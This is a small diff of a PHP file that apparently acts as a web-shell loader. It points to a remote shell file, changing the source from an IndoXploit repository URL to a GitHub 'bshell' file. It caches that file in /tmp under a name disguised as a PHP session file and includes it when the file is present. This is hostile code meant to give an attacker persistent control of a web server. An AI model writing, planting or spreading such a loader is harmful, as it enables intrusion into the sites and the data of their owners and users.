@@ -1,6 +1,6 @@
 <?php
  
-$data = ['https://www.indoxploit.or.id/repository/indoxploit_v3.txt', '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'];
+$data = ['https://github.com/mrX04/bshell/blob/main/x.txt', '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'];
  
 if(file_exists($data[1]) && filesize($data[1]) !== 0) {
     include($data[1]);
